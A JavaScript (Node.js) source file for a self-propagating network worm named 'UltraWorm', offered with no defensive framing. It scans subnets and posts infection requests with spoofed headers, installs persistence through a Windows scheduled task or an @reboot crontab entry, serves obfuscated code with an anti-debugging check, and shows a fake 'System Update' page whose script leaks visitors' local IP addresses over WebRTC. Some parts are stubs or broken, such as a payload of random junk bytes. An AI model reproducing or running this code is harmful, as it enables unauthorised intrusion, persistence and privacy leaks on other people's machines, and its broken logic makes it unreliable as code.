const http = require('http');
const https = require('https');
const os = require('os');
const fs = require('fs').promises;
const crypto = require('crypto');
const { execSync } = require('child_process');

class UltraWorm {
    constructor(port = 3000) {
        this.config = {
            infectionRadius: 5000,      // Max infection attempts per minute
            mutationRate: 0.35,         // Code mutation percentage
            payloadSize: 1024,          // Junk code padding size
            decayTime: 3600000,         // Self-destruct after 1 hour
            scanSubnets: 3              // Number of subnets to scan
        };

        this.state = {
            infectedHosts: new Set(),
            pendingInfections: new Map(),
            analytics: {
                propagationRate: 0,
                infectionVelocity: 0,
                failureTypes: new Map()
            }
        };

        this.initWormCore(port);
    }

    initWormCore(port) {
        this.selfHost = `${this.getLocalIP()}:${port}`;
        this.state.infectedHosts.add(this.selfHost);

        this.server = https.createServer(this.generateDynamicCert(), (req, res) => 
            this.handleRequest(req, res));

        this.loadPersistedInfections();
        this.activatePropagationEngine();
        this.installPersistence();
        this.server.listen(port, () => 
            console.log(`[${new Date().toISOString()}] Worm active on ${this.selfHost}`));
    }

    generateDynamicCert() {
        return crypto.generateKeyPairSync('rsa', {
            modulusLength: 512,
            publicKeyEncoding: { type: 'spki', format: 'pem' },
            privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
        });
    }

    getLocalIP() {
        return Object.values(os.networkInterfaces())
            .flatMap(iface => iface
            .filter(addr => !addr.internal && addr.family === 'IPv4'))
            [0]?.address || '127.0.0.1';
    }

    async loadPersistedInfections() {
        try {
            const data = await fs.readFile('infected.bin');
            const hosts = new Set(data.toString().match(/\d+\.\d+\.\d+\.\d+:\d+/g));
            hosts.forEach(host => this.state.infectedHosts.add(host));
        } catch {
            await this.saveInfections();
        }
    }

    async saveInfections() {
        await fs.writeFile('infected.bin', 
            [...this.state.infectedHosts].join('|'), 'binary');
    }

    async httpPropagate(target) {
        try {
            const payload = this.generateFluidPayload(target);
            await fetch(`https://${target}/infect`, {
                method: 'POST',
                body: payload,
                headers: this.generateDisguisedHeaders(),
                timeout: 250
            });
            return true;
        } catch {
            return false;
        }
    }

    async dnsPropagate(target) {
        // DNS propagation method placeholder
        return false;
    }

    async p2pPropagate(target) {
        // P2P propagation method placeholder
        return false;
    }

    propagate = {
        methods: [
            this.httpPropagate.bind(this),
            this.dnsPropagate.bind(this),
            this.p2pPropagate.bind(this)
        ],
        currentMethod: 0,
        rotateMethod: () => this.propagate.currentMethod = 
            (this.propagate.currentMethod + 1) % this.propagate.methods.length
    };

    generateFluidPayload(target) {
        const junkCode = crypto.randomBytes(this.config.payloadSize).toString('hex');
        return JSON.stringify({
            host: target,
            code: `(function(){${junkCode}/*${crypto.randomUUID()}*/})()`
        });
    }

    generateDisguisedHeaders() {
        return {
            'User-Agent': this.randomUserAgent(),
            'X-Forwarded-For': this.generateSpoofedIP(),
            'Referer': `https://${this.randomDomain()}/`,
            'Accept-Language': 'en-US,en;q=0.9'
        };
    }

    randomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    generateSpoofedIP() {
        return Array.from({length: 4}, () => 
            Math.floor(Math.random() * 255)).join('.');
    }

    randomDomain() {
        return `${crypto.randomBytes(4).toString('hex')}.com`;
    }

    activatePropagationEngine() {
        setInterval(() => this.networkRadar(), 15000);
        setInterval(() => this.propagate.rotateMethod(), 300000);
        setInterval(() => this.saveInfections(), 60000);

        setTimeout(() => {
            this.state.infectedHosts.clear();
            fs.unlink('infected.bin');
            process.exit(0);
        }, this.config.decayTime);
    }

    async networkRadar() {
        const baseIP = this.getLocalIP().split('.').slice(0, 3).join('.');

        for (let subnet = 0; subnet < this.config.scanSubnets; subnet++) {
            const scanIP = `${baseIP}.${Math.floor(Math.random() * 254) + 1}`;
            this.saturateNetwork(scanIP);
        }
    }

    saturateNetwork(baseIP) {
        Array.from({length: 254}, (_, i) => `${baseIP}.${i + 1}`)
            .forEach(ip => {
                const port = this.generateDynamicPort();
                this.propagate.methods[this.propagate.currentMethod](`${ip}:${port}`);
            });
    }

    generateDynamicPort() {
        return 3000 + Math.floor(Math.random() * 62000);
    }

    installPersistence() {
        try {
            if (process.platform === 'win32') {
                execSync(`schtasks /Create /TN "SystemUpdate" /SC MINUTE /TR "${process.argv[0]} ${__filename}"`);
            } else {
                execSync(`(crontab -l ; echo "@reboot ${process.argv[0]} ${__filename}") | crontab -`);
            }
        } catch {}
    }

    handleRequest(req, res) {
        const client = `${req.socket.remoteAddress}:${req.socket.remotePort}`;

        if (req.method === 'POST' && req.url === '/infect') {
            let data = '';
            req.on('data', chunk => data += chunk);
            req.on('end', () => {
                this.infectHost(JSON.parse(data).host);
                res.end();
            });
        }
        else if (req.url === '/payload') {
            res.end(this.generatePolymorphicCode());
        }
        else {
            res.end(this.generateDecoyPage(client));
        }
    }

    infectHost(host) {
        if (!this.state.infectedHosts.has(host)) {
            this.state.infectedHosts.add(host);
            this.saturateNetwork(host.split(':')[0]);
        }
    }

    generatePolymorphicCode() {
        const template = `
            const ${this.randomIdentifier()} = require('http');
            const ${this.randomIdentifier()} = require('child_process');
            ${this.generateJunkCode()}
            ${this.generatePropagationCode()}
            ${this.generateAntiDebug()}
        `;
        return this.obfuscateCode(template);
    }

    randomIdentifier() {
        return crypto.randomBytes(4).toString('hex');
    }

    generateJunkCode() {
        return Array.from({length: 5}, () =>
            `function ${this.randomIdentifier()}() { return "${crypto.randomBytes(8).toString('hex')}"; }`
        ).join('\n');
    }

    generateAntiDebug() {
        return `
            if (typeof process !== 'undefined' && process.env.NODE_OPTIONS?.includes('inspect')) {
                process.exit(0);
            }
        `;
    }

    obfuscateCode(code) {
        return code.split('').map(c => 
            Math.random() < this.config.mutationRate ? 
            String.fromCharCode(c.charCodeAt(0) ^ 1) : c
        ).join('');
    }

    generateDecoyPage(client) {
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <title>System Update</title>
                <script>
                    ${this.generateBrowserPropagation(client)}
                </script>
            </head>
            <body>
                <h1>Security Patches Installed</h1>
            </body>
            </html>
        `;
    }

    generateBrowserPropagation(client) {
        return `
            (function() {
                const peers = [];

                const pc = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });

                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));

                pc.onicecandidate = e => {
                    if (e.candidate) {
                        const ip = e.candidate.address;
                        peers.push(ip + ':${this.generateDynamicPort()}');
                        fetch('https://${client}/infect', {
                            method: 'POST',
                            body: JSON.stringify({host: ip}),
                            mode: 'no-cors'
                        });
                    }
                };

                setInterval(() => {
                    navigator.sendBeacon('https://${client}/infect', 
                        JSON.stringify({host: location.hostname}));
                }, 15000);
            })();
        `;
    }
}

if (require.main === module) {
    new UltraWorm(process.argv[2] || 3000);
} else {
    module.exports = UltraWorm;
}